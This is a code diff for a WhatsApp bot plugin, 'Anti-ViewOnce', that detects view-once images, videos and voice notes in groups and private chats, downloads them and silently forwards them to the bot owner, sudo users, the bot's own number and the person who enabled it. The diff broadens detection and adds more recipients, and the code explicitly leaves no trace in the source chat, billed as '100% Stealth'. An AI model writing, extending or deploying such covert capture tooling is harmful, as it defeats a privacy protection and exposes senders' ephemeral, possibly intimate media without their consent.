@@ -7,21 +7,31 @@ const isAdmin = require('../lib/isAdmin');
 
 const dataFilePath = path.join(__dirname, '../data/antiviewonce.json');
 
-// In-memory config: { dm: boolean, groups: { [groupId]: boolean } }
-let avoConfig = { dm: false, groups: {} };
+// In-memory config: { dm: boolean, recipient: string, groups: { [groupId]: { enabled: boolean, recipient: string } } }
+let avoConfig = { dm: false, recipient: null, groups: {} };
+
+function cleanJid(jid) {
+    if (!jid) return '';
+    const num = jid.split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+    return num ? `${num}@s.whatsapp.net` : '';
+}
 
 function loadConfig() {
     try {
         if (fs.existsSync(dataFilePath)) {
-            avoConfig = JSON.parse(fs.readFileSync(dataFilePath, 'utf-8'));
-            if (!avoConfig.groups) avoConfig.groups = {};
+            const raw = JSON.parse(fs.readFileSync(dataFilePath, 'utf-8'));
+            avoConfig = {
+                dm: Boolean(raw.dm),
+                recipient: raw.recipient || null,
+                groups: raw.groups || {}
+            };
         } else {
-            avoConfig = { dm: false, groups: {} };
+            avoConfig = { dm: false, recipient: null, groups: {} };
             fs.writeFileSync(dataFilePath, JSON.stringify(avoConfig, null, 2));
         }
     } catch (e) {
         console.error('[ANTIVIEWONCE] Failed to load config:', e);
-        avoConfig = { dm: false, groups: {} };
+        avoConfig = { dm: false, recipient: null, groups: {} };
     }
 }
 
@@ -45,6 +55,7 @@ loadConfig();
 async function antiviewonceCommand(sock, chatId, senderId, args, message) {
     const isGroup = chatId.endsWith('@g.us');
     const senderIsOwner = await isOwnerOrSudo(senderId, sock, chatId);
+    const normalizedSender = cleanJid(senderId || message.key.participant || chatId);
 
     if (isGroup) {
         const adminStatus = await isAdmin(sock, chatId, senderId);
@@ -54,7 +65,6 @@ async function antiviewonceCommand(sock, chatId, senderId, args, message) {
             }, { quoted: message });
         }
     } else {
-        // In DM: Only owner / sudo can toggle DM interceptor
         if (!message.key.fromMe && !senderIsOwner) {
             return await sock.sendMessage(chatId, {
                 text: '❌ *Only the bot owner can configure private chat Anti-ViewOnce!*'
@@ -66,9 +76,13 @@ async function antiviewonceCommand(sock, chatId, senderId, args, message) {
 
     if (sub === 'on' || sub === 'enable') {
         if (isGroup) {
-            avoConfig.groups[chatId] = true;
+            avoConfig.groups[chatId] = {
+                enabled: true,
+                recipient: normalizedSender
+            };
         } else {
             avoConfig.dm = true;
+            avoConfig.recipient = normalizedSender;
         }
         saveConfig();
 
@@ -77,9 +91,11 @@ async function antiviewonceCommand(sock, chatId, senderId, args, message) {
                   `┃\n` +
                   `┃  ◈ *STATUS:* ✅ Enabled\n` +
                   `┃  ◈ *SCOPE:* ${isGroup ? 'This Group' : 'Private Direct Messages'}\n` +
+                  `┃  ◈ *FORWARD TO:* @${normalizedSender.split('@')[0]}\n` +
                   `┃  ◈ *MODE:* 🥷 100% Stealth / Secret\n` +
                   `┃\n` +
-                  `╰─ Whenever anyone sends View-Once media, it will be secretly extracted and forwarded directly to the owner's private chat without alerting anyone in this chat!`
+                  `╰─ Whenever View-Once media is sent, it will be automatically extracted and sent to your private chat without alerting anyone in this chat!`,
+            mentions: [normalizedSender]
         }, { quoted: message });
 
     } else if (sub === 'off' || sub === 'disable') {
@@ -100,7 +116,7 @@ async function antiviewonceCommand(sock, chatId, senderId, args, message) {
         }, { quoted: message });
 
     } else {
-        const isCurrentActive = isGroup ? Boolean(avoConfig.groups[chatId]) : Boolean(avoConfig.dm);
+        const isCurrentActive = isGroup ? Boolean(avoConfig.groups[chatId]?.enabled || avoConfig.groups[chatId]) : Boolean(avoConfig.dm);
         return await sock.sendMessage(chatId, {
             text: `╭─ *👁️ 𝗭𝗢𝗫𝗘𝗥 𝗔𝗡𝗧𝗜-𝗩𝗜𝗘𝗪𝗢𝗡𝗖𝗘*\n` +
                   `┃\n` +
@@ -117,85 +133,146 @@ async function antiviewonceCommand(sock, chatId, senderId, args, message) {
 }
 
 /**
- * Background detector: called on every incoming message.
- * Extracts View-Once media and silently sends it to the owner's private chat.
- * CRITICAL: Leaves ZERO trace or response in the source chat.
+ * Deep search to find View-Once media inside any nested Baileys structure
  */
-async function handleViewOnceDetection(sock, chatId, message, senderId) {
-    try {
-        if (message.key.fromMe) return false;
+function findViewOnceMedia(message) {
+    if (!message || !message.message) return null;
 
-        const isGroup = chatId.endsWith('@g.us');
-        const isEnabled = isGroup ? Boolean(avoConfig.groups?.[chatId]) : Boolean(avoConfig.dm);
-        if (!isEnabled) return false;
+    let m = message.message;
 
-        const m = message.message || {};
-        const vOnce = m.viewOnceMessageV2?.message ||
-                      m.viewOnceMessage?.message ||
-                      m.viewOnceMessageV2Extension?.message ||
-                      null;
+    // Unwrap wrappers
+    if (m.ephemeralMessage?.message) m = m.ephemeralMessage.message;
+    if (m.documentWithCaptionMessage?.message) m = m.documentWithCaptionMessage.message;
+    if (m.editedMessage?.message) m = m.editedMessage.message;
 
-        let mediaContent = null;
-        let mediaType = null;
-        let mimeType = null;
-        let caption = '';
+    let vOnce = null;
+    if (m.viewOnceMessageV2?.message) vOnce = m.viewOnceMessageV2.message;
+    else if (m.viewOnceMessage?.message) vOnce = m.viewOnceMessage.message;
+    else if (m.viewOnceMessageV2Extension?.message) vOnce = m.viewOnceMessageV2Extension.message;
 
-        if (vOnce) {
-            if (vOnce.imageMessage) {
-                mediaContent = vOnce.imageMessage;
-                mediaType = 'image';
-                mimeType = 'image/jpeg';
-                caption = vOnce.imageMessage.caption || '';
-            } else if (vOnce.videoMessage) {
-                mediaContent = vOnce.videoMessage;
-                mediaType = 'video';
-                mimeType = 'video/mp4';
-                caption = vOnce.videoMessage.caption || '';
-            } else if (vOnce.audioMessage) {
-                mediaContent = vOnce.audioMessage;
-                mediaType = 'audio';
-                mimeType = 'audio/ogg; codecs=opus';
-                caption = '';
-            }
-        } else if (m.imageMessage?.viewOnce) {
+    if (vOnce?.ephemeralMessage?.message) vOnce = vOnce.ephemeralMessage.message;
+
+    let mediaContent = null;
+    let mediaType = null;
+    let mimeType = null;
+    let caption = '';
+
+    if (vOnce) {
+        if (vOnce.imageMessage) {
+            mediaContent = vOnce.imageMessage;
+            mediaType = 'image';
+            mimeType = 'image/jpeg';
+            caption = vOnce.imageMessage.caption || '';
+        } else if (vOnce.videoMessage) {
+            mediaContent = vOnce.videoMessage;
+            mediaType = 'video';
+            mimeType = 'video/mp4';
+            caption = vOnce.videoMessage.caption || '';
+        } else if (vOnce.audioMessage) {
+            mediaContent = vOnce.audioMessage;
+            mediaType = 'audio';
+            mimeType = vOnce.audioMessage.mimetype || 'audio/ogg; codecs=opus';
+            caption = '';
+        }
+    } else {
+        // Direct flags on media
+        if (m.imageMessage && (m.imageMessage.viewOnce || m.imageMessage.viewOnceMessage)) {
             mediaContent = m.imageMessage;
             mediaType = 'image';
             mimeType = 'image/jpeg';
             caption = m.imageMessage.caption || '';
-        } else if (m.videoMessage?.viewOnce) {
+        } else if (m.videoMessage && (m.videoMessage.viewOnce || m.videoMessage.viewOnceMessage)) {
             mediaContent = m.videoMessage;
             mediaType = 'video';
             mimeType = 'video/mp4';
             caption = m.videoMessage.caption || '';
-        } else if (m.audioMessage?.viewOnce) {
+        } else if (m.audioMessage && (m.audioMessage.viewOnce || m.audioMessage.viewOnceMessage)) {
             mediaContent = m.audioMessage;
             mediaType = 'audio';
-            mimeType = 'audio/ogg; codecs=opus';
+            mimeType = m.audioMessage.mimetype || 'audio/ogg; codecs=opus';
             caption = '';
         }
+    }
 
-        if (!mediaContent || !mediaContent.mediaKey) {
+    if (!mediaContent || !mediaContent.mediaKey) {
+        return null;
+    }
+
+    return { mediaContent, mediaType, mimeType, caption };
+}
+
+/**
+ * Background detector: called on every incoming message.
+ * Extracts View-Once media and silently sends it to the owner / recipient private chat.
+ * Leaves ZERO trace or response in the source chat.
+ */
+async function handleViewOnceDetection(sock, chatId, message, senderId) {
+    try {
+        if (!chatId || message.key?.fromMe) return false;
+
+        const isGroup = chatId.endsWith('@g.us');
+        const groupEntry = avoConfig.groups?.[chatId];
+        const isGroupEnabled = isGroup && (groupEntry === true || Boolean(groupEntry?.enabled));
+        const isDmEnabled = !isGroup && Boolean(avoConfig.dm);
+
+        if (!isGroupEnabled && !isDmEnabled) {
             return false;
         }
 
-        console.log(`[ANTIVIEWONCE] Stealth-intercepting ViewOnce ${mediaType} from ${senderId} in ${chatId}`);
+        const found = findViewOnceMedia(message);
+        if (!found) {
+            return false;
+        }
 
-        // Download the media stream
+        const { mediaContent, mediaType, mimeType, caption } = found;
+        console.log(`[ANTIVIEWONCE] Detected ViewOnce ${mediaType} from ${senderId} in ${chatId}`);
+
+        // Download media buffer
         const stream = await downloadContentFromMessage(mediaContent, mediaType);
         let buffer = Buffer.from([]);
         for await (const chunk of stream) {
             buffer = Buffer.concat([buffer, chunk]);
         }
 
-        if (!buffer || buffer.length === 0) return false;
+        if (!buffer || buffer.length === 0) {
+            console.error('[ANTIVIEWONCE] Downloaded buffer was empty');
+            return false;
+        }
 
-        // Determine target private destinations (Bot's own number & primary owner)
-        const selfJid = sock.user?.id ? (sock.user.id.split(':')[0].split('@')[0] + '@s.whatsapp.net') : null;
-        const ownerJid = (settings.ownerNumber || '').replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+        // Collect all target recipient JIDs
+        const targets = new Set();
 
-        const destinations = new Set([selfJid, ownerJid].filter(Boolean));
+        // 1. Configured recipient who enabled the command
+        if (!isGroup && avoConfig.recipient) {
+            targets.add(cleanJid(avoConfig.recipient));
+        }
+        if (isGroup && groupEntry?.recipient) {
+            targets.add(cleanJid(groupEntry.recipient));
+        }
 
-        // Get chat metadata for context
+        // 2. All owners and sudo users from settings
+        const ownerNums = settings.ownerNumbers || [settings.ownerNumber];
+        for (const num of ownerNums) {
+            const c = cleanJid(num);
+            if (c) targets.add(c);
+        }
+        if (settings.ownerNumber) {
+            const c = cleanJid(settings.ownerNumber);
+            if (c) targets.add(c);
+        }
+
+        // 3. If the sender themself is an owner testing the bot, also ensure it goes back to them
+        const senderClean = cleanJid(senderId || message.key.participant || chatId);
+        const senderIsOwner = await isOwnerOrSudo(senderClean, sock, chatId);
+        if (senderIsOwner) {
+            targets.add(senderClean);
+        }
+
+        // 4. Also add the bot's own self JID
+        if (sock.user?.id) {
+            targets.add(cleanJid(sock.user.id));
+        }
+
         let chatName = 'Private Chat';
         if (isGroup) {
             try {
@@ -206,7 +283,7 @@ async function handleViewOnceDetection(sock, chatId, message, senderId) {
             }
         }
 
-        const senderTag = `@${String(senderId).split('@')[0]}`;
+        const senderTag = `@${senderClean.split('@')[0]}`;
         const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 
         const headerCaption = `🥷 *STEALTH VIEW-ONCE INTERCEPTED*\n\n` +
@@ -214,51 +291,52 @@ async function handleViewOnceDetection(sock, chatId, message, senderId) {
                               `📍 *Source:* ${chatName}\n` +
                               `🕒 *Time:* ${timeStr}\n` +
                               (caption ? `💬 *Caption:* ${caption}\n` : '') +
-                              `\n_Sent privately to owner. No message was posted in the chat._`;
+                              `\n_Sent privately. No message was left in the source chat._`;
 
-        for (const dest of destinations) {
+        let sentCount = 0;
+        for (const targetJid of targets) {
+            if (!targetJid) continue;
             try {
                 if (mediaType === 'image') {
-                    await sock.sendMessage(dest, {
+                    await sock.sendMessage(targetJid, {
                         image: buffer,
                         caption: headerCaption,
-                        mentions: [senderId]
+                        mentions: [senderClean]
                     });
                 } else if (mediaType === 'video') {
-                    await sock.sendMessage(dest, {
+                    await sock.sendMessage(targetJid, {
                         video: buffer,
                         caption: headerCaption,
-                        mentions: [senderId]
+                        mentions: [senderClean]
                     });
                 } else if (mediaType === 'audio') {
-                    await sock.sendMessage(dest, {
+                    await sock.sendMessage(targetJid, {
                         audio: buffer,
                         mimetype: mimeType,
-                        ptt: true,
-                        contextInfo: {
-                            externalAdReply: {
-                                title: `View-Once Voice Note from ${senderTag}`,
-                                body: `Intercepted from ${chatName}`,
-                                mediaType: 2
-                            }
-                        }
+                        ptt: true
+                    });
+                    await sock.sendMessage(targetJid, {
+                        text: headerCaption,
+                        mentions: [senderClean]
                     });
                 }
-            } catch (sendErr) {
-                console.error(`[ANTIVIEWONCE] Failed sending to ${dest}:`, sendErr.message);
+                sentCount++;
+            } catch (err) {
+                console.error(`[ANTIVIEWONCE] Failed to send to ${targetJid}:`, err.message);
             }
         }
 
-        // Return true to signify interception, but notice we DO NOT send anything to chatId!
+        console.log(`[ANTIVIEWONCE] Intercepted & forwarded to ${sentCount} recipient(s)!`);
         return true;
 
     } catch (err) {
-        console.error('[ANTIVIEWONCE] Error in stealth interceptor:', err);
+        console.error('[ANTIVIEWONCE] Error in handleViewOnceDetection:', err);
         return false;
     }
 }
 
 module.exports = {
     antiviewonceCommand,
-    handleViewOnceDetection
+    handleViewOnceDetection,
+    findViewOnceMedia
 };
